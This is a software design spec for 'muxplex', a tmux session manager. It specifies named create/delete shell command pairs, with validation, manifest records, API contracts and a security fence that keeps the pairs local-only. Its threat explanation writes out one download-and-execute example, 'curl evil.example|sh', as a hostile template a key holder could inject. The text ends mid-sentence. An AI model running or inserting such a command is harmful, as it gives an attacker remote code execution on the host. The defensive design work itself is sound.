# Implementation Specification: Named Session Command Pairs

Status: **SHIPPED in v0.33.0 (2026-08-02).** Retained as an architectural
decision record. §2's security posture is the part still live: `session_commands`
holds arbitrary shell commands the server itself executes, so it shipped in
`settings.LOCAL_ONLY_KEYS` and deliberately absent from `SYNCABLE_KEYS` — the API
may list and select a pair, never define one, and managing pairs means editing
`~/.config/muxplex/settings.json` on the host. That fence is why Settings >
Commands is read-only, and §16 records "editing pairs from the UI/API" as a
decision rather than an omission — read both before designing any surface for
managing pairs. See AGENTS.md → "Terminal input" and `docs/API_SEMANTICS.md` →
"Named session command pairs".

**Scope discipline:** this pluralizes an existing two-key mechanism. It does not build a subsystem.

---

## 0. Corrections to the brief — read first

Everything in the brief checked out against the code **except** the CLI claim. Two additional
facts were found that a builder will hit and must not be surprised by. None of them break the
design; one of them changes it (§0.3 forces the storage decision).

### 0.1 The CLI has a **create** path but **no delete** path, and it is not in `cli.py`

> Brief: *"the CLI (`muxplex/cli.py` has its own create/delete path that replays the same
> template — find it)"*

Verified reality:

| Claim | Reality |
|---|---|
| CLI has a create path | ✅ True — but it lives in **`muxplex/restore.py:209`** (`execute_restore()` → `sessions.spawn_session_command`). `cli.py:1369` (`cmd_restore`) only drives it. |
| CLI has a delete path | ❌ **False.** `delete_session_template` is read at **exactly one site in the whole repo**: `main.py:1557`. `grep -rn delete_session_template muxplex/ --exclude-dir=tests` returns settings.py (definition/comments) and main.py only. |

**Consequence:** §8 specifies changes to `restore.py`, not a CLI delete path. This is not a
gap — it means `muxplex restore` is the *only* extra create surface, and it is the one that
matters most (see §0.3).

### 0.2 `save_settings()` silently drops any key not in `DEFAULT_SETTINGS` — this is a data-loss trap

`settings.save_settings()` (settings.py:335-338) rebuilds the file from `DEFAULT_SETTINGS` and
copies over only keys that exist there. `load_settings()` (settings.py:216-218) does the same on
read.

**Therefore:** if an operator hand-adds `session_commands` to `settings.json` and the new key is
**not** in `DEFAULT_SETTINGS`, the next write of *any* setting from *any* writer (a PWA font-size
change, a federation sync, `muxplex config set`) **erases the entire pairs configuration**, with a
settings-history snapshot as the only recovery.

Adding `"session_commands": []` to `DEFAULT_SETTINGS` is **load-bearing, not cosmetic**. §3.1.

### 0.3 Both existing per-session stores reap on absence — which rules one of them out

The obvious home for the per-session `command_id` is `state.json`'s `sessions[<name>]` map. It
cannot be used:

`main.py:370-372` (poll cycle, every ~2s):
```python
deleted = [s for s in list(state["sessions"]) if s not in name_set]
for name in deleted:
    del state["sessions"][name]
```

`spawn_session_command()` has a documented branch (sessions.py:524-532) where a long-running
template **exceeds the 30s wait and the endpoint returns success before the session exists**. In
that window the poll cycle would delete the just-written `command_id`. The session then appears
with no record, and delete would fall back to the default pair — a silently wrong teardown, which
is exactly the failure the brief forbids.

**Consequence:** the record goes in a store whose lifecycle is *written on create, removed on
confirmed death* — not *reconciled against live tmux every 2s*. §5 specifies the manifest
(`sessions.json`), in a **new top-level map** (not inside `sessions`, which has the same reap
loop at manifest.py:273-280).

### 0.4 `muxplex config set` on a fenced key silently reports success and does nothing

`cli.py:1591` calls `patch_settings({key: value})`, which skips `LOCAL_ONLY_KEYS`
(settings.py:428-439) — then `cli.py:1592` prints `  {key}: {value}` unconditionally. So today:

```
$ muxplex config set new_session_template 'foo {name}'
  new_session_template: foo {name}      # <- lie; nothing was written
```

This is a **pre-existing wart**, not caused by this feature, but this feature makes it far more
likely to be hit (a user told "edit settings.json" will reasonably try `config set` first).
**Out of scope for this spec** (§16), but every piece of user-facing copy specified below names
the *file*, never `muxplex config set`. File a separate issue.

### 0.5 Everything else in the brief verified correct

| Brief claim | Verified |
|---|---|
| `new_session_template` at settings.py:44 | ✅ |
| `delete_session_template` at settings.py:47 | ✅ |
| Both in `LOCAL_ONLY_KEYS` at settings.py:163-173 | ✅ |
| `spawn_session_command` ~sessions.py:421-500 | ✅ (def at :420, docstring :421-455, body to :541) |
| Non-zero-exit-but-session-exists = success (TTY attach) | ✅ sessions.py:499-511 |
| `shlex.quote()` + allowlist as the two injection layers | ✅ sessions.py:472, main.py:1559, `_require_valid_session_name` main.py:1207 |
| Read-only template UI precedent naming the file path | ✅ `index.html:277-283`, `app.js:5039-5043` and `:5131-5135` |
| Neither template in `SYNCABLE_KEYS` | ✅ settings.py:175-203 |

---

## 1. What is being built

A list of **named create/delete command pairs** in `settings.json`. A pair is selectable at
session-create time. The pair used to create a session is **recorded**, so delete automatically
runs the matching teardown without the user remembering anything.

Five invariants that must hold at the end:

1. **A client that sends nothing behaves byte-identically to today.** `POST /api/sessions
   {"name":"x"}` runs `new_session_template`; `DELETE /api/sessions/x` runs
   `delete_session_template`. Responses gain one additive field each and change nothing else.
2. **The API can list and select pairs. It can never define one.** Same fence, same reasoning as
   the v0.31.4 incident.
3. **No silent substitution.** If a session's recorded pair no longer exists, delete refuses.
4. **`muxplex restore` recreates with the recorded pair**, or reports FAIL. It must never
   silently recreate an `amplifier-workspace` session as a bare `tmux new-session` — AGENTS.md's
   recovery section calls that out by name: *"A bare tmux session is one window with the wrong
   cwd; it looks restored and isn't."*
5. **One pair configured ⇒ the create UI's DOM is unchanged.**

---

## 2. Security posture (non-negotiable)

`session_commands` holds **arbitrary shell commands**, executed by the server via
`create_subprocess_shell` / `subprocess.run(shell=True)`. It is exactly the capability that
`LOCAL_ONLY_KEYS` exists to fence.

**Enforcement — all four, none optional:**

| # | Mechanism | Where | Effect |
|---|---|---|---|
| S1 | `"session_commands"` added to `settings.LOCAL_ONLY_KEYS` | settings.py:163-173 | `patch_settings()` skips the key with a `logger.warning` and applies the rest of the patch (existing loop, settings.py:426-440 — no new code) |
| S2 | `"session_commands"` **deliberately absent** from `SYNCABLE_KEYS` | settings.py:175-203 | Federation sync can neither read it out (`get_syncable_settings()` filters to `SYNCABLE_KEYS`) nor write it in (`apply_synced_settings()` iterates `SYNCABLE_KEYS`) |
| S3 | The write path is `~/.config/muxplex/settings.json` **only** | — | `load_settings()` applies no `LOCAL_ONLY_KEYS` filtering, so a local file edit takes effect. Unchanged behavior. |
| S4 | No endpoint accepts a template string, ever | §7 | `POST /api/sessions` accepts an **id** (constrained charset, §3.3); it is looked up, never interpolated into a command |

**The threat this closes, restated for the commit message:** the federation Bearer key satisfies
auth on `PATCH /api/settings` and is the same credential handed to remote agents. If
`session_commands` were PATCHable, a Bearer-key holder could define a pair
`{"id":"x","new_session_template":"curl evil.example|sh"}` and then `POST /api/sessions
{"name":"a","command_id":"x"}` — the identical RCE closed in v0.31.4, reopened through a new door.

**The trade this buys:** "managing" pairs means editing `~/.config/muxplex/settings.json`. That
is correct and must be communicated honestly in the UI (§10.4), not papered over.

**Also note:** `command_id` values are never passed to a shell. They are dict keys used for
lookup. The constrained charset in §3.3 exists for predictable error messages, logs, and UI —
not as a security boundary. Do not describe it as one.

---

## 3. Settings schema

### 3.1 The new key

Add to `DEFAULT_SETTINGS` (settings.py), immediately after `delete_session_template` (:47) so the
three related keys read together:

```python
    # Additional NAMED create/delete command pairs, beyond the implicit
    # "default" pair formed by new_session_template/delete_session_template
    # above. Each entry is:
    #     {"id": str, "label": str,
    #      "new_session_template": str, "delete_session_template": str}
    #
    # SECURITY: these are arbitrary shell commands, executed by the server
    # exactly like the two singular keys above. This key is in
    # LOCAL_ONLY_KEYS and deliberately NOT in SYNCABLE_KEYS for the same
    # reason (see LOCAL_ONLY_KEYS's comment block): a federation Bearer-key
    # holder who could define a pair and then select it at create time would
    # have full RCE without ever touching the fenced /input endpoint. The
    # API may LIST and SELECT a pair (GET /api/session-commands,
    # POST /api/sessions {"command_id": ...}); it can never DEFINE one.
    #
    # Resolution (including how the singular keys above fold in as the
    # reserved "default" entry, and the validation rules) lives in exactly
    # one place: resolve_session_commands().
    "session_commands": [],
```

### 3.2 Entry shape

```jsonc
{
  "id":                      "amplifier",                          // required
  "label":                   "Amplifier workspace",                // required
  "new_session_template":    "amplifier-workspace ~/dev/{name}",   // required
  "delete_session_template": "amplifier-dev --destroy {name}"      // required
}
```

Field names deliberately match the singular settings keys. This makes the folding rule literally
true ("the singular pair *is* entry `default`") and makes the security rule stateable in one
sentence: *every settings value whose key ends in `_session_template`, at any nesting depth, is a
server-executed shell command and is local-only.*

Worked `settings.json` fragment:

```jsonc
{
  "new_session_template": "tmux new-session -d -s {name}",
  "delete_session_template": "tmux kill-session -t {name}",
  "session_commands": [
    {
      "id": "amplifier",
      "label": "Amplifier workspace",
      "new_session_template": "amplifier-workspace ~/dev/{name}",
      "delete_session_template": "amplifier-dev --destroy {name}"
    },
    {
      "id": "scratch",
      "label": "Scratch (in /tmp)",
      "new_session_template": "tmux new-session -d -s {name} -c /tmp",
      "delete_session_template": "tmux kill-session -t {name}"
    }
  ]
}
```

### 3.3 Validation rules

Module constants in `settings.py`, beside `LOCAL_ONLY_KEYS`:

```python
RESERVED_COMMAND_ID: str = "default"
COMMAND_ID_RE: re.Pattern[str] = re.compile(r"\A[a-z0-9][a-z0-9_-]{0,31}\Z")
COMMAND_LABEL_MAX_LEN: int = 64
```

(`re` is not currently imported by settings.py — add the import.)

An entry is **valid** iff *all* hold:

| # | Rule | Error message template |
|---|---|---|
| V1 | the entry is a `dict` | `session_commands[{i}]: entry must be an object, got {type}` |
| V2 | `id` is a `str` matching `COMMAND_ID_RE` | `session_commands[{i}]: 'id' must match [a-z0-9][a-z0-9_-]{0,31} (got {id!r})` |
| V3 | `id != RESERVED_COMMAND_ID` | `session_commands[{i}]: id 'default' is reserved for the new_session_template/delete_session_template pair` |
| V4 | `label` is a non-empty `str`, `len <= COMMAND_LABEL_MAX_LEN` | `session_commands[{i}]: 'label' must be a non-empty string of at most 64 characters` |
| V5 | `new_session_template` is a non-empty `str` containing `{name}` | `session_commands[{i}] ({id}): 'new_session_template' must be a non-empty string containing '{name}'` |
| V6 | `delete_session_template` is a non-empty `str` containing `{name}` | `session_commands[{i}] ({id}): 'delete_session_template' must be a non-empty string containing '{name}'` |
| V7 | `id` is not shared with another entry | `session_commands: duplicate id {id!r} at indexes {i}, {j} — all copies rejected` |

**On V7 (duplicates): reject *every* entry sharing the id, not "first wins".** First-wins means a
user who duplicates an id during an edit gets a silently-wrong command. Rejecting all copies makes
`command_id=<dup>` a visible 400/409 instead.

**On V5/V6 (`{name}` required): this rule applies to `session_commands` entries ONLY. It is NOT
applied retroactively to the singular `new_session_template` / `delete_session_template` keys.**
Those are un-validated today; adding validation to them would be a breaking change for an exotic
existing config, and the brief mandates additive-only. This asymmetry is deliberate — write it
down in the code comment so a later contributor doesn't "fix" it.

### 3.4 What happens when both singular and plural are configured

**Both exist. There is no conflict to resolve.** The singular pair is always resolved as entry
`default`, always first in the list. `session_commands` entries follow, in file order. This is
what makes the change zero-breakage: an existing config with no `session_commands` resolves to a
one-entry list identical in behavior to today.

### 3.5 Failure policy: fail loud, do not fail fatal

The repo convention is "fail loud, no silent degradation." Refusing to *start* on a malformed
entry is the wrong reading of it here: a typo in `settings.json` would take the service down and
strand the user's live tmux sessions with no UI. That trades a config typo for the exact class of
outage AGENTS.md is built around avoiding.

The rule that actually matters — *never silently run the wrong command* — is enforced at the
point of use, not at boot:

| Condition | Behavior |
|---|---|
| Entry fails any of V1–V7 | Excluded from the resolved list; a human-readable string appended to `errors`; logged at **ERROR** |
| `command_id` names an excluded (or absent) entry, on create | **400**, no command run (§7.2) |
| `command_id` recorded for a session names an excluded (or absent) entry, on delete | **409**, no command run (§7.3) |
| `session_commands` is not a list (e.g. a dict or a string) | Whole key treated as `[]`; one error: `session_commands: must be a list of objects, got {type} — ignoring` |

There is no path by which a rejected entry silently becomes "use the default". That is the
guarantee; boot-time fatality is not.

**Logging sites:**
- `resolve_session_commands()` logs each error at `ERROR` on every call that produces errors.
  Resolution is only called from user-initiated paths (create, delete, `GET
  /api/session-commands`, restore) — **never from the ~2s poll cycle** — so this is not noisy.
- One call at startup, in `lifespan()` (main.py:635), beside the existing `app.js` md5 log
  (main.py:644), so a broken config is visible in the service journal at boot without a request.

---

## 4. Resolution — `muxplex/settings.py`

One function is the single source of truth. Nothing else may fold, validate, or default.

```python
def resolve_session_commands(
    settings: dict | None = None,
) -> tuple[list[dict], list[str]]:
    """Resolve the configured session command pairs into an ordered list.

    Returns ``(commands, errors)``.

    ``commands`` is never empty: element 0 is ALWAYS the reserved
    ``"default"`` entry, synthesized from the singular
    ``new_session_template`` / ``delete_session_template`` settings keys.
    That is what makes this feature additive -- a config with no
    ``session_commands`` at all resolves to a one-element list whose
    behavior is identical to pre-feature muxplex. Valid ``session_commands``
    entries follow, in file order.

    Each element is a dict with exactly the keys ``id``, ``label``,
    ``new_session_template``, ``delete_session_template``.

    ``errors`` is a list of human-readable strings, one per rejected entry
    (see the validation rules in this module's docstring / the spec). An
    invalid entry is EXCLUDED from ``commands`` -- it never silently
    degrades into the default pair. A caller that then looks up its id gets
    None from find_session_command() and MUST surface that as an error
    rather than substituting anything (main.py's create/delete handlers,
    restore.py's execute_restore).

    *settings* is accepted so callers that already hold a loaded settings
    dict (e.g. delete_session()) do not re-read the file; None loads it.

    The reserved id ``"default"`` may not be claimed by a session_commands
    entry -- the legacy pair is never displaceable, which is what
    guarantees the zero-config path can never be broken by a config edit.
    """
```

Reference behavior (not code to copy verbatim — the contract above is binding, this is the shape):

- `settings = settings if settings is not None else load_settings()`
- default entry: `{"id": "default", "label": "Default",
  "new_session_template": settings["new_session_template"],
  "delete_session_template": settings["delete_session_template"]}`
- iterate `settings.get("session_commands")`; apply V1–V6 per entry, collecting errors
- after the pass, apply V7 across surviving ids; drop all members of each duplicate group
- log every error at `ERROR`
- return `([default_entry, *valid], errors)`

**On the `"Default"` label:** it is the literal string `"Default"`, not derived from the command.
An operator whose singular template is `amplifier-workspace {name}` will see "Default" next to
"Amplifier workspace" in the picker, which is mildly ambiguous. This is accepted deliberately: the
settings tab shows the full command beside every entry (§10.4), and the picker `<option>` carries
the command in a `title` attribute (§10.2), so the ambiguity never survives a hover. Adding a
`default_command_label` setting is a key nobody has asked for — add it when someone does.

```python
def find_session_command(
    command_id: str | None,
    settings: dict | None = None,
) -> dict | None:
    """Return the resolved command pair for *command_id*, or None if it does
    not resolve.

    ``command_id=None`` returns the reserved ``"default"`` entry -- this is
    the no-command_id path every pre-existing client takes, and it must
    always succeed.

    Returns None for an id that is unknown, or that named an entry rejected
    by validation. Callers MUST treat None as an error (400/409/FAIL) and
    MUST NOT fall back to the default entry -- silently running the wrong
    teardown command is the specific failure this feature exists to
    prevent.
    """
```

---

## 5. The per-session record — `muxplex/manifest.py`

### 5.1 Why the manifest, and not `state.json`

See §0.3 for why `state.json` is disqualified. Two further reasons the manifest is positively
right, not merely the leftover option:

1. **`muxplex restore` reads it.** `restore.execute_restore()` (restore.py:209) recreates from
   `pending_restore`. The command_id must be reachable there or invariant 4 (§1) is unmeetable.
   Any other store would need a second lookup path.
2. **It already computes "confirmed gone".** manifest.py's same-epoch tombstone
   (manifest.py:273-280) is precisely "observed dead against a live, identity-matched server" —
   which is exactly when a `command_id` record becomes garbage. Reusing it means no new TTL, no
   new reaper, no new timer. (Compare `state.py:gc_sync_groups`'s rationale — same move.)

### 5.2 Schema

New **top-level** map, sibling to `sessions` — deliberately *not* inside it, because
`sessions[name]` is subject to the same reap-on-absence loop that disqualified `state.json`:

```jsonc
{
  "schema": 2,
  "epoch": { ... },
  "sessions": { ... },
  "pending_restore": null,
  "created_with": {            // NEW: session name -> command_id
    "muxplex-work": "amplifier",
    "scratch-1": "default"
  }
}
```

`MANIFEST_SCHEMA_VERSION` (manifest.py:72): `1` → `2`.

### 5.3 `load_manifest()` changes (manifest.py:104-130)

After the existing `setdefault` block, add:

```python
    if not isinstance(data.get("created_with"), dict):
        data["created_with"] = {}
    # Forward-only version normalization, mirroring settings.save_settings()'s
    # stance on `_schema_version` ("clients do not get to write older
    # versions"). A v1 manifest read by this code IS a v2 manifest -- the
    # only difference is created_with, which we just materialized as {} --
    # so recording it as v1 would be a lie. Nothing branches on this value;
    # it exists as an honest marker, not a switch.
    data["schema"] = MANIFEST_SCHEMA_VERSION
```

**Upgrade path:** a pre-feature manifest yields `created_with == {}`, so every existing session
has no record, so delete uses the default pair — byte-identical to today (§6.2). No migration
step, no backfill.

### 5.4 `update_manifest()` changes (manifest.py:182-320)

`created_with` is threaded through all three return sites and reaped by exactly two rules:

| Branch | `created_with` handling |
|---|---|
| `epoch_now is None` (tmux unavailable) | **Untouched.** Existing early return at :245 already returns `manifest` unchanged — no code change needed. Knowledge is unavailable, not refuted; this is the same discrimination the rest of the function makes. |
| `epoch_rec is None` (first run / upgrade) | Carried through unchanged: `manifest.get("created_with", {})` |
| **Same epoch** | **Reap rule 1:** in the existing tombstone loop (:273-280), when `del sessions[name]` fires, also `created_with.pop(name, None)`. Set `changed = True` only via the existing `sessions` deletion (the pop is a side effect of a change already counted — do not add a second `changed` trigger, which would break the "< 1 write/minute" steady-state target at manifest.py:194-196). |
| **Cold start** (epoch differs) | **Reap rule 2:** retain only keys in `set(live_names) \| set(pending_restore["sessions"])`; drop the rest. Retaining the `pending_restore` names is what lets `muxplex restore` recreate with the right pair. Dropping the rest is what garbage-collects records for sessions that were created but never appeared (§5.5). |

**Why the tombstone rule keys off `sessions[name]` deletion and nothing else:** a name that was
never observed alive is not in `sessions`, so the tombstone loop never sees it, so its
`created_with` record survives the window between "create returned" and "session finally appears"
(§0.3). That window is the whole reason this map is not inside `sessions`.

### 5.5 Bounded-growth analysis

The only leak is a create that succeeded at the API level but whose session never appeared (the
30s-timeout branch, template failed later). Such a record is never tombstoned (no `sessions` entry
to tombstone) — it persists until the next tmux-server cold start, where reap rule 2 drops it.

Bound: *one short string per never-appeared session, since the last tmux server restart.* On the
real host that is measured in bytes. No TTL, no sweep, no new timer. Explicitly accepted.

### 5.6 Accessors

Two small helpers in `manifest.py`, so no caller open-codes the map:

```python
def get_created_with(manifest: dict[str, Any], name: str) -> str | None:
    """Return the command_id recorded for *name* at create time, or None.

    None means "muxplex has no record of creating this session" -- a
    pre-existing tmux session, one created outside muxplex, or one created
    before this feature existed. Callers treat None as "use the default
    pair", which is byte-identical to pre-feature behavior. It is NOT the
    same as a recorded-but-unresolvable id (see main.py's delete_session()).
    """


def set_created_with(manifest: dict[str, Any], name: str, command_id: str) -> dict[str, Any]:
    """Return a NEW manifest with ``created_with[name] = command_id``.

    Pure -- never mutates *manifest* in place, matching mark_restored()'s
    contract, so a caller doing a read-right-before-write (to minimize the
    window against the concurrently running poll loop -- see restore.py's
    module docstring) can call this on a freshly-loaded manifest and save
    the result immediately.
    """
```

### 5.7 Concurrency

The poll cycle's manifest read-modify-write runs inside `async with state_lock` (main.py:311,
338-346). The create handler's record write must take the same lock, held **only** across the
tiny `load_manifest()` / `set_created_with()` / `save_manifest()` sequence — **never across
`spawn_session_command()`**, which can block for 30s and would stall the poll loop (and with it
bells, previews, and the whole PWA).

Ordering: run the command → *then*, on success, take the lock and record. Rationale: the record
asserts "this session was created with pair X"; that is not true until the create succeeded, so a
failed create writes nothing and leaves no garbage. The benign interleaving (poll cycle tombstones
a name whose record is not yet written) is a `dict.pop(name, None)` no-op.

`delete_session()` reads the manifest **before** running the delete command, outside the lock
(a plain `load_manifest()` read; the file is written atomically via `os.replace`, so a reader
never sees a partial file — manifest.py:146-152).

---

## 6. Failure cases — specified exhaustively

### 6.1 Recorded `command_id` no longer resolves (pair deleted or renamed in settings)

**This is the interesting case, and the answer is: refuse.**

We *know* the session was created by pair `X`, and `X` is gone. Running the default
`tmux kill-session` instead may leave the real teardown undone — a container still running, a
worktree still mounted, a lock still held. Substituting is precisely the "fallback that hides a
failure" the brief forbids.

`DELETE /api/sessions/{name}` → **409**, no command run, no state written:

```json
{
  "detail": "Session 'muxplex-work' was created with command 'amplifier', which is no longer configured. Restore it in ~/.config/muxplex/settings.json, or retry with ?force=true to use the default kill command.",
  "unknown_command_id": true,
  "command_id": "amplifier",
  "name": "muxplex-work",
  "available": ["default", "scratch"]
}
```

`unknown_command_id: true` is the discriminator, following the established convention for
distinguishing 409 causes (`backstop: true` on the settings destructive-write guard,
`terminal_conflict: true` on the connect terminal-claim gate — API_SEMANTICS.md).

**Escape hatch — `?force=true`.** Without one the session is undeletable from the UI, which is
worse than the substitution it prevents. With it, the substitution is an explicit, logged,
client-visible act rather than a silent one. This mirrors `?takeover=true` on `POST
/connect` and `allow_destructive: true` on `PATCH /api/settings` — the repo's established shape
for "refuse by default, override in the open".

`?force=true` behavior: use the `default` pair, `logger.warning` naming both the missing id and
the command actually run, return `200 {"ok": true, "name": ..., "command_id": "default",
"forced": true}`.

### 6.2 No record at all — sessions muxplex did not create

Pre-existing tmux sessions, sessions created by hand or by another tool, and every session that
existed before this feature shipped.

**Use the default pair. This is not a fallback — it is today's behavior, unchanged, and the only
defensible answer.** muxplex has no information to act on and no basis to refuse: refusing would
make every pre-existing session undeletable on upgrade.

Response: `200 {"ok": true, "name": ..., "command_id": "default"}` — identical to today plus one
additive field.

The distinction from §6.1 is the whole point: **absent record ≠ broken record.** Absent means "we
never knew"; broken means "we knew, and the thing we knew is gone." Only the second is an error.
`get_created_with()`'s docstring (§5.6) states this so it cannot be conflated in code.

### 6.3 `command_id` unknown at **create** time

`POST /api/sessions` with a `command_id` that does not resolve → **400**, nothing spawned:

```json
{
  "detail": "Unknown command_id 'typo'. Configured: default, amplifier, scratch.",
  "unknown_command_id": true,
  "available": ["default", "amplifier", "scratch"]
}
```

400 (not 404): the session name is fine, the request body is wrong. 400 is already this endpoint's
code for a bad body (`_require_valid_session_name`, main.py:1220-1227). Validation runs **before**
`spawn_session_command()` — no partial effect.

### 6.4 The pair is renamed *between* create and delete

Identical to §6.1 — the record holds the old id, which no longer resolves, so delete 409s. This is
correct and intentional: a rename is a delete plus an add from the record's perspective, and
muxplex must not guess that `amplifier2` is "the same pair as" `amplifier`.

The 409's `detail` names the missing id, so the operator's fix is mechanical: re-add an entry with
the old id, or `?force=true`. Document this in README (§12).

### 6.5 `muxplex restore` with an unresolvable recorded id

Not a substitution, not a silent skip: a **FAIL** result for that session.

```python
SessionResult(
    name=name,
    status="fail",
    detail="recorded command 'amplifier' is no longer configured; "
           "restore it in ~/.config/muxplex/settings.json and re-run",
)
```

Failed names remain in `pending_restore` for a later retry (`_persist_restored()` is called only
with verified-restored names — restore.py:243-245, existing behavior, no change). `cmd_restore`'s
exit code is already 1 on any FAIL (`if report.any_failed: sys.exit(1)`, cli.py:1504-1505;
contract stated at cli.py:1409-1411). Nothing new is needed to make this loud.

### 6.6 Full failure matrix

| Situation | Create | Delete | Restore |
|---|---|---|---|
| No `command_id` sent / no record | `default` pair, 200 | `default` pair, 200 | `default` pair, ok |
| Valid `command_id` / resolvable record | that pair, 200 | that pair, 200 | that pair, ok |
| Unknown or rejected `command_id` | **400**, nothing spawned | **409**, nothing killed | **FAIL**, nothing spawned |
| Unknown recorded id + `?force=true` | n/a | `default` pair, 200, `forced: true`, warning logged | n/a (re-run after fixing config) |
| `session_commands` malformed entry | that entry absent from `available`; ids naming it → 400 | same → 409 | same → FAIL |
| `session_commands` not a list | key treated as `[]`; only `default` resolves | same | same |

---

## 7. API contracts

All three changes are additive. A client that sends nothing gets a response whose existing fields
are unchanged, plus one new field it is expected to tolerate (AGENTS.md: *"Clients are expected to
tolerate unknown fields"*).

### 7.1 `GET /api/session-commands` — NEW

**Path naming is load-bearing:** `/api/session-commands`, **not** `/api/sessions/commands`. The
latter would collide with `GET /api/sessions/{name}` (main.py:995) and resolve by declaration
order — a route-ordering landmine of exactly the kind main.py:1536 already documents for `DELETE
/api/sessions/current`. A distinct literal prefix has no ordering constraint at all.

Auth: the shared middleware (Bearer / localhost bypass / session cookie). **Not** added to
`auth._AUTH_EXEMPT_PATHS` — this discloses server-side shell commands.

Placement: `main.py`, immediately after `GET /api/sessions/{name}` (ends ~:1080) and before
`GET /api/view` (:1083).

```python
@app.get("/api/session-commands")
async def list_session_commands() -> dict:
```

Response `200`:

```json
{
  "commands": [
    {
      "id": "default",
      "label": "Default",
      "new_session_template": "tmux new-session -d -s {name}",
      "delete_session_template": "tmux kill-session -t {name}"
    },
    {
      "id": "amplifier",
      "label": "Amplifier workspace",
      "new_session_template": "amplifier-workspace ~/dev/{name}",
      "delete_session_template": "amplifier-dev --destroy {name}"
    }
  ],
  "default_id": "default",
  "errors": []
}
```

- `commands` — the resolved, validated, ordered list. **Never empty**; `commands[0].id` is always
  `"default"`.
- `default_id` — always the literal `"default"`. Present so a client never hardcodes the string.
- `errors` — `[]` when the config is clean; otherwise one human-readable string per rejected
  entry. A client SHOULD surface these (the PWA does, §10.4). This is what makes a bad config
  visible to the operator without reading the journal.

**Why the templates are included:** they are already returned unredacted by `GET /api/settings`
(main.py:1698-1704 redacts only `federation_key` and `remote_instances[].key`), and the existing
Commands tab already displays both (index.html:277-283). Including them is not a new disclosure,
and the read-only settings UI needs them.

**Why a dedicated endpoint rather than making clients read `settings.session_commands`:** the
resolution — folding the legacy pair in as `default`, excluding invalid entries, surfacing errors
— is exactly the kind of rule AGENTS.md says to resolve server-side: *"resolve it server-side (as
`GET /api/view` now does) rather than shipping more logic for each of PWA / sidecar / agents to
port — duplication across clients is where drift bugs come from."* Three clients re-implementing
the fold is three chances to get it wrong.

`session_commands` still appears raw in `GET /api/settings` (nothing filters it). That is harmless
and additive; clients MUST use `/api/session-commands` for the resolved view. Say so in
API_SEMANTICS.md.

### 7.2 `POST /api/sessions` — additive body field

`CreateSessionPayload` (main.py:810-819) gains one optional field:

```python
class CreateSessionPayload(BaseModel):
    name: str
    # Which configured command pair creates this session. None (the default,
    # and what every pre-existing client sends) resolves to the reserved
    # "default" pair -- i.e. settings.new_session_template -- so a request
    # body of {"name": "x"} is byte-identical to pre-feature behavior. The
    # id is looked up (settings.find_session_command); it is NEVER
    # interpolated into a command. See GET /api/session-commands for the
    # valid ids.
    command_id: str | None = None
```

**Body field, not query param.** The endpoint already takes a JSON body; the pair is part of the
creation intent, not a modifier of an otherwise-identical request; and Pydantic's default gives
the version-tolerance property for free. (Contrast `?device_id=` / `?takeover=` on `connect`,
which modify how an otherwise-identical action is routed — a genuinely different shape.)

Handler changes (main.py:1231-1262), in order:

1. `_require_valid_session_name(name)` — unchanged, still first.
2. **New:** resolve. `command = find_session_command(payload.command_id)`. If `None` → `400` per
   §6.3, before any subprocess.
3. `ok, error = await spawn_session_command(name, command_id=payload.command_id)` — §8.1.
4. On failure → `500` with `error` (unchanged).
5. **New:** on success, record. `async with state_lock:` load manifest, `set_created_with(m, name,
   command["id"])`, save. Note `command["id"]`, not `payload.command_id` — normalizes `None` to
   the literal `"default"`, so the record is always explicit.
6. Return `{"name": name, "ok": True, "command_id": command["id"]}`.

**Byte-identity check for an existing client:** body `{"name":"x"}` → step 2 resolves `default`
(never 400) → step 3 runs `settings["new_session_template"]` exactly as `spawn_session_command`
does today → response gains only `command_id: "default"`. Every pre-existing field and status code
is unchanged.

### 7.3 `DELETE /api/sessions/{name}` — additive query param, no new required input

```python
@app.delete("/api/sessions/{name}")
async def delete_session(name: str, force: bool = False) -> dict:
```

**No `command_id` input. Deliberate, not an oversight** — write this in the docstring:

- Design point 3 of the brief: *"The user should never have to remember what made a session —
  that's what makes it a pair."* An input parameter reintroduces exactly the remembering the
  feature removes.
- Security: accepting a caller-chosen `command_id` at delete time would let any authenticated
  caller run *pair A's teardown command against a pair-B session* — a way to invoke an arbitrary
  configured command against an arbitrary session name. Not RCE (the command is still
  operator-defined), but it is a capability with no use case, and the fence philosophy says don't
  ship it.

Handler changes (main.py:1526-1585), in order:

1. `_require_valid_session_name(name)` — unchanged.
2. `known = get_session_list()`; `name not in known` → `404` — unchanged (fail-closed).
3. `settings = load_settings()` — unchanged.
4. **New:** `recorded = get_created_with(load_manifest(), name)`.
5. **New:** resolve:
   - `recorded is None` → `command = find_session_command(None, settings)` (the `default` entry).
     §6.2.
   - `recorded is not None` → `command = find_session_command(recorded, settings)`.
     - `None` and not `force` → **409** per §6.1. **Return before the subprocess.**
     - `None` and `force` → `command = find_session_command(None, settings)`; `logger.warning`
       naming `recorded`, `name`, and the substituted command.
6. `command_str = command["delete_session_template"].replace("{name}", shlex.quote(name))`
   — replaces main.py:1557-1559. **The `shlex.quote()` call and the two-layer injection story are
   unchanged** and the existing comment block (main.py:1550-1556) stays, amended to say the
   template now comes from the resolved pair rather than the settings key directly.
7. `subprocess.run(...)` block — **entirely unchanged**, including `input="y\n"`,
   `timeout=30`, `env=tmux_env()`, and the warn-don't-raise error handling.
8. Return `{"ok": True, "name": name, "command_id": command["id"]}`, plus `"forced": True` when
   the force path was taken.

**Byte-identity check:** a session with no record, no `?force` → step 5 picks `default` → step 6
produces the exact string today's code produces → same subprocess call, same 200 → response gains
only `command_id: "default"`. Endpoint still returns 200 on command failure (existing contract at
main.py:1532-1533 — do not change this; the UI depends on it to refresh).

### 7.4 Federation proxies

`federation_create_session` (main.py:3085-3128) builds its body explicitly at :3112. Change:

```python
            json=(
                {"name": payload.name}
                if payload.command_id is None
                else {"name": payload.name, "command_id": payload.command_id}
            ),
```

Conditional, not unconditional: a `command_id: null` field sent to a **pre-feature peer** is
harmlessly ignored by Pydantic, but omitting it keeps the proxied request byte-identical to
today's for the overwhelmingly common case, which is the cheaper thing to be able to assert.

**The id namespace belongs to the remote, not to us.** A local id like `amplifier` may mean
something else, or nothing, on the peer — where it will produce a 400 (§6.3), surfaced as a 502 by
the proxy's `raise_for_status()`. That is honest and correct.

Consequences, both mandatory:
- The frontend **must not** send `command_id` when a remote device is selected (§10.3).
- `GET /api/federation/{device_id}/session-commands` is **deliberately NOT added in v1.** There is
  no consumer, and adding it would invite a cross-device picker whose failure modes (peer
